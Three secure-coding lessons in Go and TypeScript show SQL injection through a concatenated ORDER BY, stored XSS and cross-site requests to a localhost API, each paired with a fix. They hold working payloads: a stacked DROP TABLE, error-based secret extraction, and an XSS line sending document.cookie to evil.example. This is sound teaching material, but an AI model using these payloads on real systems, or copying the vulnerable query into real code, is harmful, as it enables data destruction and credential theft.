// LEARN(design.architecture.security): the input parameters can't cover, and the error message that leaks.
package main

import (
	"context"
	"errors"
	"fmt"
	"log"
	"os"

	"github.com/jackc/pgx/v5"
)

// titles binds the owner as a parameter. ORDER BY can't take a parameter, so
// the sort column arrives from the query string and is concatenated.
func titles(ctx context.Context, conn *pgx.Conn, owner, sort string) ([]string, error) {
	rows, _ := conn.Query(ctx, "SELECT title FROM notes WHERE owner = $1 ORDER BY "+sort, owner)
	return pgx.CollectRows(rows, pgx.RowTo[string])
}

var ErrBadSort = errors.New("unknown sort key")

// sortSQL is the allow-list: public keys map to SQL the program wrote itself.
var sortSQL = map[string]string{"title": "title", "newest": "created_at DESC"}

func titlesSafe(ctx context.Context, conn *pgx.Conn, owner, key string) ([]string, error) {
	col, ok := sortSQL[key]
	if !ok {
		return nil, ErrBadSort // a 400 for the client, before any SQL exists
	}
	return titles(ctx, conn, owner, col)
}

func main() {
	ctx := context.Background()
	conn, err := pgx.Connect(ctx, os.Getenv("DATABASE_URL"))
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close(ctx)
	_, err = conn.Exec(ctx, `
		CREATE TABLE notes (owner text, title text, created_at date);
		CREATE TABLE api_keys (owner text, secret text);
		INSERT INTO notes VALUES ('ayse', 'Defer', '2026-11-01'), ('ayse', 'Joins', '2026-11-12');
		INSERT INTO api_keys VALUES ('admin', 'sk_live_7Hq2')`)
	if err != nil {
		log.Fatal(err)
	}

	for _, sort := range []string{
		"title",
		"title; DROP TABLE api_keys", // stacked query
		"(SELECT CAST(secret AS int) FROM api_keys LIMIT 1)", // error-based
	} {
		got, err := titles(ctx, conn, "ayse", sort)
		fmt.Printf("concatenated ORDER BY %s\n  -> %v %v\n", sort, got, err)
	}
	_, err = titlesSafe(ctx, conn, "ayse", "(SELECT CAST(secret AS int) FROM api_keys LIMIT 1)")
	fmt.Println("allow-listed, unknown key\n  ->", err)
	got, err := titlesSafe(ctx, conn, "ayse", "newest")
	fmt.Println("allow-listed, newest\n  ->", got, err)
}

// LEARN(design.architecture.security): XSS is stopped by encoding at output, and every sink has its own rules.
import { renderToStaticMarkup } from "react-dom/server";

// Stored by another user. Both passed validation: non-empty, under 500 characters.
const comment = `Harika ders! <img alt="" onerror="fetch('//evil.example?c='+document.cookie)">`;
const website = "javascript:alert(document.cookie)";

// DOM sinks: innerHTML parses its input as markup, textContent never does.
const viaHTML = document.createElement("div");
viaHTML.innerHTML = comment;
const viaText = document.createElement("div");
viaText.textContent = comment;
console.log("innerHTML   created:", [...viaHTML.querySelectorAll("*")].map((e) => e.outerHTML));
console.log("textContent created:", viaText.children.length, "elements");

// React escapes text children and attribute values...
console.log(renderToStaticMarkup(<p>{comment}</p>));
// ...but an attribute's *meaning* is not its encoding: a javascript: URL is a valid href.
console.log(renderToStaticMarkup(<a href={website}>my site</a>));
// And the escape hatch is named for what it is.
console.log(renderToStaticMarkup(<p dangerouslySetInnerHTML={{ __html: comment }} />));

// The fix for URLs is an allow-list of schemes, applied where the value is used.
function safeHref(raw: string): string | undefined {
  try {
    const url = new URL(raw);
    return url.protocol === "https:" || url.protocol === "http:" ? url.href : undefined;
  } catch {
    return undefined; // not an absolute URL
  }
}
for (const raw of [website, "https://ışıl.dev/notlar", " JaVaScRiPt:alert(1)"]) {
  console.log(JSON.stringify(raw), "->", safeHref(raw) ?? "(no link)");
}

// LEARN(design.architecture.security): a JSON API on 127.0.0.1 is reachable from any page in the browser.
package main

import (
	"encoding/json"
	"fmt"
	"mime"
	"net/http"
	"net/http/httptest"
	"strings"
)

// run has the shape of a code-runner endpoint: decode JSON, act on it.
// No cookies, no auth: being on 127.0.0.1 is its only credential.
func run(w http.ResponseWriter, r *http.Request) {
	var req struct{ Runtime, Code string }
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid request body", http.StatusBadRequest)
		return
	}
	fmt.Fprintf(w, "ran %d bytes of %s", len(req.Code), req.Runtime)
}

// requireJSON refuses bodies a cross-site page could send without a CORS preflight.
func requireJSON(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if mt, _, _ := mime.ParseMediaType(r.Header.Get("Content-Type")); mt != "application/json" {
			http.Error(w, "Content-Type must be application/json", http.StatusUnsupportedMediaType)
			return
		}
		next(w, r)
	}
}

func main() {
	servers := []struct {
		name string
		h    http.Handler
	}{
		{"no defense", http.HandlerFunc(run)},
		{"requireJSON", requireJSON(run)},
		{"CrossOriginProtection", http.NewCrossOriginProtection().Handler(http.HandlerFunc(run))},
	}
	// fetch(url, {method: "POST", mode: "no-cors", body: JSON.stringify(...)}) from
	// another site sends exactly this: a "simple" request, no preflight.
	senders := []struct {
		name  string
		ctype string
		site  string
	}{
		{"evil.example page", "text/plain;charset=UTF-8", "cross-site"},
		{"the app's own page", "application/json", "same-origin"},
		{"curl", "application/json", ""},
	}
	for _, s := range servers {
		srv := httptest.NewServer(s.h)
		for _, from := range senders {
			body := strings.NewReader(`{"Runtime":"go","Code":"package main"}`)
			req, _ := http.NewRequest("POST", srv.URL+"/api/run", body)
			req.Header.Set("Content-Type", from.ctype)
			if from.site != "" { // browsers add Sec-Fetch-Site; page scripts can't forge it
				req.Header.Set("Sec-Fetch-Site", from.site)
			}
			if from.site == "cross-site" {
				req.Header.Set("Origin", "https://evil.example")
			}
			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				fmt.Println(err)
				continue
			}
			resp.Body.Close()
			fmt.Printf("%-22s %-19s -> %d\n", s.name, from.name, resp.StatusCode)
		}
		srv.Close()
	}
}

